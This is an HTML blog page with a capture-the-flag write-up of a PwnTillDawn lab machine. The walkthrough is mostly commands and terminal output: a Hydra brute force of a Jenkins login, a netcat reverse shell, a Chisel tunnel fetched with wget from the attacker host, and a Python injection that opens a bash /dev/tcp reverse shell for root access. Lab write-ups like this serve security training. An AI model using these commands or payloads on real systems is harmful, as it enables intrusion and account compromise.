@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <met#aeb3b8et="utf-8">
+        <title>@elliot-hacks</title>
+        <meta content="width=device-width, initial-scale=1.0" name="viewport">
+        <meta content="Elliot Jamhuri Nkwama" name="keywords">
+        <meta content="Elliot Nkwama" name="keywords">
+        <meta content="elliot-hacks" name="keywords">
+        <meta content="Hackthebox" name="keywords">
+        <meta content="tryhackme" name="keywords">
+        <meta content="Active Directory" name="keywords">
+        <meta content="Reverse Engineering" name="keywords">
+        <meta content="Cryptography" name="keywords">
+        <meta content="Binary Exploitation" name="keywords">
+        <meta content="Writeups" name="keywords">
+        <meta content="OSINT" name="keywords">
+        <meta content="Forensics" name="keywords">
+        <meta content="Android Penetration Testing" name="keywords">
+        <meta content="Miscelenious" name="keywords">
+        <meta content="Cyber Security blog" name="description">
+
+        <!-- Favicon -->
+        <link href="img/favicon.ico" rel="icon">
+
+        <!-- Google Web Fonts -->
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link href="https://fonts.googleapis.com/css2?family=Heebo:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+
+        <!-- Icon Font Stylesheet -->
+        <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.10.0/css/all.min.css" rel="stylesheet">
+        <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.4.1/font/bootstrap-icons.css" rel="stylesheet">
+
+        <!-- Libraries Stylesheet -->
+        <link href="/lib/owlcarousel/assets/owl.carousel.min.css" rel="stylesheet">
+        <link href="/lib/lightbox/css/lightbox.min.css" rel="stylesheet">
+        <link href="/lib/animate/animate.min.css" rel="stylesheet">
+
+        <!-- Customized Bootstrap Stylesheet -->
+        <link href="/css/bootstrap.min.css" rel="stylesheet">
+
+        <!-- Template Stylesheet -->
+        <link href="/css/style.css" rel="stylesheet">
+    </head>
+
+    <body style="margin: 0; font-family: Arial, sans-serif;">
+            <!-- Navigation Header -->
+            <header style="background-color: #333; color: white; padding: 15px 20px; position: sticky; top: 0; z-index: 1000; display: flex; justify-content: space-between; align-items: center;">
+                <a href="#" style="font-size: 24px; font-weight: bold; color: white; text-decoration: none;">@elliot-hacks</a>
+                <nav id="navMenu" style="display: flex; gap: 20px;">
+                    <a href="#home" style="color: white; text-decoration: none; font-size: 16px;">Home</a>
+                    <a href="#about" style="color: white; text-decoration: none; font-size: 16px;">About</a>
+                    <a href="#blog" style="color: white; text-decoration: none; font-size: 16px;">Blog</a>
+                    <a href="#contact" style="color: white; text-decoration: none; font-size: 16px;">Contact</a>
+                </nav>
+                <div id="hamburgerMenu" style="font-size: 24px; cursor: pointer; display: none;">☰</div>
+            </header>
+        
+            <!-- Content Placeholder -->
+            <main style="padding: 20px; position: sticky; top: 0">
+                <h1>Welcome to My Blog</h1>
+                <p>Let's talk Security!</p>
+            </main>
+
+        <div class="container">
+            <div class="row g-5">
+                <div class="col-lg-4 sticky-lg-top vh-100">
+                    <div class="d-flex flex-column h-100 text-center overflow-auto shadow">
+                        <img class="w-100 img-fluid mb-4" src="/img/elliot-hacks.jpg" style="height: 400px;" alt="Image">
+                        <h1 class="text-primary mt-2">Elliot Jamhuri Nkwama</h1>
+                        <div class="mb-4" style="height: 22px;">
+                            <h4 class="typed-text-output d-inline-block text-light"></h4>
+                            <div class="typed-text d-none">Penetration Tester, Web Developer, Android Developer, System Archtecture</div>
+                        </div>
+                        <div class="d-flex justify-content-center mt-auto mb-3">
+                            <a class="btn btn-secondary btn-square mx-1" href="https://twitter.com/elliotH4cks"><i class="fab fa-twitter"></i></a>
+                            <a class="btn btn-secondary btn-square mx-1" href="https://facebook.com/thisguyhack"><i class="fab fa-facebook-f"></i></a>
+                            <a class="btn btn-secondary btn-square mx-1" href="https://linkdeln.com/in/elliot-hacks"><i class="fab fa-linkedin-in"></i></a>
+                            <a class="btn btn-secondary btn-square mx-1" href="https://instagram.com/elliot.nkwama"><i class="fab fa-instagram"></i></a>
+                        </div>
+                        <div class="d-flex align-items-end justify-content-between border-top">
+                            <a href="" class="btn w-50 border-end">Download CV</a>
+                            <a href="#contact" class="btn w-50 btn-scroll">Contact Me</a>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-8">
+                    <!-- About Start -->
+                    <section class="py-5 border-bottom wow fadeInUp" data-wow-delay="0.1s">
+                        <h1 class="title pb-3 mb-5">Blue Pawntilldawn</h1>
+                        <div class="row mb-4">
+                            <article>
+                                <h2 id="pwntilldawn-juniordev-machine-write-up">PwnTillDawn JuniorDev Machine Write-Up</h2>
+                                <h3 id="1-service-scan-with-nmap">1. Service Scan with Nmap</h3>
+                                <p>To identify open ports and services, I conducted a comprehensive scan with Nmap:</p>
+                                <pre><code class="lang-bash"><span class="hljs-selector-tag">msf</span> &gt;&gt; <span class="hljs-selector-tag">db_nmap</span> <span class="hljs-selector-tag">-p-</span> <span class="hljs-selector-tag">-T5</span> <span class="hljs-selector-tag">-vv</span> 10<span class="hljs-selector-class">.150</span><span class="hljs-selector-class">.150</span><span class="hljs-selector-class">.38</span>
+                                </code></pre>
+                                <p><strong>Results:</strong></p>
+                                <ul>
+                                <li><strong>Port 22</strong>: SSH (open)</li>
+                                <li><strong>Port 30609</strong>: Unknown service (open)</li>
+                                </ul>
+                                <hr>
+                                <pre>
+                                    <code>
+[msf](Jobs:0 Agents:0) >> db_nmap -p- -T5 -vv 10.150.150.38
+[*] Nmap: Scanning 10.150.150.38 [65535 ports]
+[*] Nmap: Nmap scan report for 10.150.150.38
+[*] Nmap: Host is up, received echo-reply ttl 63 (0.26s latency).
+[*] Nmap: Scanned at 2024-09-12 09:44:21 EAT for 505s
+[*] Nmap: Not shown: 65533 closed tcp ports (reset)
+[*] Nmap: PORT      STATE SERVICE REASON
+[*] Nmap: 22/tcp    open  ssh     syn-ack ttl 63
+[*] Nmap: 30609/tcp open  unknown syn-ack ttl 63
+[*] Nmap: Read data files from: /usr/bin/../share/nmap
+[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 505.39 seconds
+[*] Nmap: Raw packets sent: 72198 (3.177MB) | Rcvd: 70163 (2.807MB)
+
+                                    </code>
+                                </pre>
+                                <hr>
+                                <h3 id="2-brute-forcing-jenkins-login">2. Brute Forcing Jenkins Login</h3>
+                                <p>A brute-force attack was performed on the Jenkins server running on port 30609 using Hydra:</p>
+                                <pre><code class="lang-bash">hydra -l admin -P /usr/share/wordlists/rockyou.txt -s <span class="hljs-number">30609</span> <span class="hljs-number">10.150</span><span class="hljs-number">.150</span><span class="hljs-number">.38</span> http-post-form -t <span class="hljs-number">30</span> <span class="hljs-string">"/j_acegi_security_check:j_username=^USER^&amp;j_password=^PASS^&amp;from=%2F&amp;Submit=Sign+in:Invalid"</span>
+                                </code></pre>
+                                <p><strong>Result:</strong></p>
+                                <ul>
+                                <li>Login: <code>admin</code></li>
+                                <li>Password: <code>matrix</code></li>
+                                </ul>
+                                <hr>
+                                <pre>
+                                    <code>
+┌─[elliot@parrot]─[~]
+└──╼ $hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 30609 10.150.150.38 http-post-form -t 30 '/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid'
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-12 10:18:08
+[DATA] max 30 tasks per 1 server, overall 30 tasks, 14344399 login tries (l:1/p:14344399), ~478147 tries per task
+[DATA] attacking http-post-form://10.150.150.38:30609/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid
+[STATUS] 477.00 tries/min, 477 tries in 00:01h, 14343922 to do in 501:12h, 30 active
+[30609][http-post-form] host: 10.150.150.38   login: admin   password: matrix
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-12 10:19:40
+
+                                    </code>
+                                </pre>
+                                <hr>
+                                <h3 id="4-capturing-the-reverse-shell">4. Capturing the Reverse Shell</h3>
+                                <p>The reverse shell was successfully initiated as I found a interactive console to interact with </p>
+                                <h1><img src="jun_whoami.png" alt="whoami"></h1>
+                                <p>After gaining access, I started exploring the system. Using the <code>find</code> command, I located potential flags:</p>
+                                <pre><code class="lang-bash"><span class="hljs-built_in">find</span> / -<span class="hljs-built_in">name</span> <span class="hljs-built_in">FLAG</span>* <span class="hljs-number">2</span>&gt;/dev/null
+                                </code></pre>
+                                <p><strong>Results:</strong></p>
+                                <ul>
+                                <li><code>/var/lib/jenkins/users/FLAG69_7705914462374786576</code></li>
+                                <li><code>/var/lib/jenkins/FLAG70.txt</code></li>
+                                </ul>
+                                <p>I accessed the contents of <code>FLAG70.txt</code> and inspected <code>FLAG69</code> for hidden information.</p>
+                                <hr>
+                                <pre>
+                                    <code>
+┌─[✗]─[elliot@parrot]─[~]
+└──╼ $nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.66.66.54] from (UNKNOWN) [10.150.150.38] 34746
+locate FLAG*
+/bin/bash: line 1: locate: command not found
+find / -name FLAG* 2>/dev/null
+/var/lib/jenkins/users/FLAG69_7705914462374786576
+/var/lib/jenkins/FLAG70.txt
+python -c "import pty;pty.spawn('/bin/sh')"
+bash
+bash
+$ jenkins@dev1:/$ cat /var/lib/jenkins/users/FLAG69_7705914462374786576
+cat /var/lib/jenkins/users/FLAG69_7705914462374786576
+cat: /var/lib/jenkins/users/FLAG69_7705914462374786576: Is a directory
+jenkins@dev1:/$ ls /var/lib/jenkins/users/FLAG69_7705914462374786576
+ls /var/lib/jenkins/users/FLAG69_7705914462374786576
+config.xml
+jenkins@dev1:/$ cat /var/lib/jenkins/users/FLAG69_7705914462374786576/config.xml
+    [ REDUCTED ]
+      passwordHash>#jbcrypt:$2a$10$hzIuA8mfLq7hjbaj5PEqyukvpF0V5RKkKfnsMIV5DjjQXuh0y66O.
+    [ REDUCTED ]
+jenkins@dev1:/$ cat /var/lib/jenkins/FLAG70.txt
+cat /var/lib/jenkins/FLAG70.txt
+
+                                    </code>
+                                </pre>
+                                <hr>
+                                <h3 id="5-privilege-escalation-and-further-discovery">5. Privilege Escalation and Further Discovery</h3>
+                                <p>After attempting privilege escalation, I identified a locally-hosted calculator app on port 8080 using <code>netstat</code>:</p>
+                                <pre><code class="lang-bash"><span class="hljs-attribute">netstat -antlp</span>
+                                </code></pre>
+                                <p>However, the service was accessible only on localhost. Inspecting the HTML revealed a commented reference to another flag:</p>
+                                <pre><code class="lang-html"><span class="hljs-comment">&lt;!-- &lt;img src="./static/FLAG.png"&gt; --&gt;</span>
+                                </code></pre>
+                                <hr>
+                                <pre>
+                                    <code>
+jenkins@dev1:/$ netstat -antlp
+netstat -antlp
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::30609                :::*                    LISTEN      467/java            
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+tcp6       1      0 10.150.150.38:30609     10.66.66.54:51032       CLOSE_WAIT  467/java            
+tcp6       0      0 10.150.150.38:34746     10.66.66.54:4444        ESTABLISHED 467/java 
+
+
+jenkins@dev1:/$ cd /tmp
+cd /tmp
+jenkins@dev1:/tmp$ ls
+ls
+hsperfdata_jenkins
+hsperfdata_root
+jetty-0_0_0_0-30609-war-_-any-9986462623835705441.dir
+systemd-private-1757a29a649941ff9aec912c7924b74b-systemd-timesyncd.service-0uHx2M
+winstone13733391394321067299.jar
+jenkins@dev1:/tmp$ wget localhost:8080
+wget localhost:8080
+--2020-07-29 08:30:22--  http://localhost:8080/
+Resolving localhost (localhost)... ::1, 127.0.0.1
+Connecting to localhost (localhost)|::1|:8080... failed: Connection refused.
+Connecting to localhost (localhost)|127.0.0.1|:8080... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: unspecified [text/html]
+Saving to: ‘index.html’
+
+index.html              [ <=>                ]     607  --.-KB/s    in 0s      
+
+2020-07-29 08:30:22 (14.5 MB/s) - ‘index.html’ saved [607]
+
+jenkins@dev1:/tmp$ cat index.html
+cat index.html
+                                    </code>
+                                </pre>
+                                <hr>
+                                <h3 id="6-tunneling-with-chisel">6. Tunneling with Chisel</h3>
+                                <p>To access the calculator app remotely, I set up a reverse tunnel using Chisel:</p>
+                                <pre><code class="lang-bash">
+                                <span class="hljs-comment"><strong>On the attacker machine</strong></span>
+                                <span class="hljs-attribute">chisel</span> server --port <span class="hljs-number">1234</span> --reverse
+
+                                <span class="hljs-comment"><strong>On the target machine</strong></span>
+                                wget http://10.66.66.54:8000/chisel
+                                chmod +x chisel
+                                ./chisel client <span class="hljs-number">10.66.66.54:1234</span> R:<span class="hljs-number">8080</span>:<span class="hljs-number">127.0.0.1:8080</span>
+                                </code></pre>
+                                <hr>
+                                <h3 id="7-exploiting-the-calculator-app">7. Exploiting the Calculator App</h3>
+                                <p>From the first column of the calculator, I executed a Python reverse shell payload:</p>
+                                <pre><code class="lang-python"><span class="hljs-selector-tag">__import__</span>(<span class="hljs-string">'os'</span>)<span class="hljs-selector-class">.system</span>(<span class="hljs-string">'bash -c "bash -i &gt;&amp; /dev/tcp/10.66.66.54/8200 0&gt;&amp;1"'</span>)
+                                </code></pre>
+                                <hr>
+                                <h3 id="8-root-access-and-final-flag">8. Root Access and Final Flag</h3>
+                                <p>Upon connecting to the reverse shell listener on port 8200, I obtained root access:</p>
+                                <pre><code class="lang-bash">nc -lvnp <span class="hljs-number">8200</span>
+                                </code></pre>
+                                <p>I navigated to the <code>/root</code> directory and retrieved the final flag:</p>
+                                <pre><code class="lang-bash">cat <span class="hljs-regexp">/root/</span>FLAG72.txt
+                                </code></pre>
+                                <hr>
+                                <pre>
+                                    <code>
+┌─[elliot@parrot]─[~]
+└──╼ $nc -lvnp 8200
+listening on [any] 8200 ...
+connect to [10.66.66.54] from (UNKNOWN) [10.150.150.38] 54848
+bash: cannot set terminal process group (400): Inappropriate ioctl for device
+bash: no job control in this shell
+root@dev1:~/mycalc# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@dev1:~/mycalc# pwd
+pwd
+/root/mycalc
+root@dev1:~/mycalc# ls
+ls
+base.html
+__pycache__
+static
+templates
+untitled.py
+untitled.pyc
+root@dev1:~/mycalc# ls /root
+ls /root
+FLAG72.txt
+mycalc
+root@dev1:~/mycalc# cat /root/FLAG72.txt
+cat /root/FLAG72.txt
+                                    </code>
+                                </pre>
+                                <hr>
+                                <h1>Just Like that I pawned the juniourDev machine</h1>
+                                <p><img src="juniourDev.png" alt=""></p>
+                                <hr>
+                            </article>
+                        </div>
+                    </section>
+                    <!-- About End -->
+
+                    <!-- Footer Start -->
+                    <section class="wow fadeIn" data-wow-delay="0.1s">
+                        <div class="bg-secondary text-light text-center p-5">
+                            <div class="d-flex justify-content-center mb-4">
+                                <a class="btn btn-dark btn-square mx-1" href="https://twitter.com/elliotH4cks"><i class="fab fa-twitter"></i></a>
+                                <a class="btn btn-dark btn-square mx-1" href="https://facebook.com/thisguyhack"><i class="fab fa-facebook-f"></i></a>
+                                <a class="btn btn-dark btn-square mx-1" href="https://linkdeln.com/in/elliot-hacks"><i class="fab fa-linkedin-in"></i></a>
+                                <a class="btn btn-dark btn-square mx-1" href="https://instagram.com/elliot.nkwama"><i class="fab fa-instagram"></i></a>
+                            </div>
+                            <div class="d-flex justify-content-center mb-3">
+                                <a class="text-light px-3 border-end" href="#">Privacy</a>
+                                <a class="text-light px-3 border-end" href="#">Terms</a>
+                                <a class="text-light px-3 border-end" href="#">FAQs</a>
+                                <a class="text-light px-3" href="#">Help</a>
+                            </div>
+							
+                            <!--/*** This template is free as long as you keep the footer author’s credit link/attribution link/backlink. If you'd like to use the template without the footer author’s credit link/attribution link/backlink, you can purchase the Credit Removal License from "https://htmlcodex.com/credit-removal". Thank you for your support. ***/-->
+							<p class="m-0">&copy; All Rights Reserved. <a href="mailto:thisguyhack@gmail.com">elliot-hacks</a></p>
+                        </div>
+                    </section>
+                    <!-- Footer End -->
+                </div>
+            </div>
+        </div>
+
+        
+        <!-- Back to Top -->
+        <a href="#" class="back-to-top"><i class="fa fa-angle-double-up"></i></a>
+        
+        <!-- JavaScript Libraries -->
+        <script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
+        <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.bundle.min.js"></script>
+        <script src="/lib/wow/wow.min.js"></script>
+        <script src="/lib/typed/typed.min.js"></script>
+        <script src="/lib/easing/easing.min.js"></script>
+        <script src="/lib/waypoints/waypoints.min.js"></script>
+        <script src="/lib/counterup/counterup.min.js"></script>
+        <script src="/lib/owlcarousel/owl.carousel.min.js"></script>
+        <script src="/lib/isotope/isotope.pkgd.min.js"></script>
+        <script src="/lib/lightbox/js/lightbox.min.js"></script>
+
+        <!-- Contact Javascript File -->
+        <script src="/mail/jqBootstrapValidation.min.js"></script>
+        <script src="/mail/contact.js"></script>
+
+        <!-- Template Javascript -->
+        <script src="/js/main.js"></script>
+
+        <!-- Inline JavaScript for Interactivity -->
+        <script>
+            // Toggle navigation menu for mobile
+            document.getElementById('hamburgerMenu').addEventListener('click', function () {
+                const navMenu = document.getElementById('navMenu');
+                if (navMenu.style.display === 'flex') {
+                    navMenu.style.display = 'none';
+                } else {
+                    navMenu.style.display = 'flex';
+                    navMenu.style.flexDirection = 'column';
+                    navMenu.style.backgroundColor = '#333';
+                    navMenu.style.position = 'absolute';
+                    navMenu.style.top = '60px';
+                    navMenu.style.right = '20px';
+                    navMenu.style.padding = '10px';
+                    navMenu.style.borderRadius = '4px';
+                }
+            });
+
+            // Initial check for screen size
+            if (window.innerWidth <= 768) {
+                document.getElementById('hamburgerMenu').style.display = 'block';
+                document.getElementById('navMenu').style.display = 'none';
+            }
+    
+            // Show hamburger menu on smaller screens
+            window.addEventListener('resize', function () {
+                const navMenu = document.getElementById('navMenu');
+                const hamburgerMenu = document.getElementById('hamburgerMenu');
+                if (window.innerWidth <= 768) {
+                    hamburgerMenu.style.display = 'block';
+                    navMenu.style.display = 'none';
+                } else {
+                    hamburgerMenu.style.display = 'none';
+                    navMenu.style.display = 'flex';
+                }
+            });
+    
+            function copyToClipboard(elementId) {
+            // Get the code block element
+            const codeBlock = document.getElementById(elementId);
+
+            // Create a temporary textarea to hold the code
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeBlock.innerText;
+            document.body.appendChild(tempTextArea);
+
+            // Select and copy the text
+            tempTextArea.select();
+            document.execCommand('copy');
+
+            // Remove the temporary textarea
+            document.body.removeChild(tempTextArea);
+
+            // Optional: Provide feedback
+            alert('Code copied to clipboard!');
+        } 
+        </script>
+    </body>
+</html>
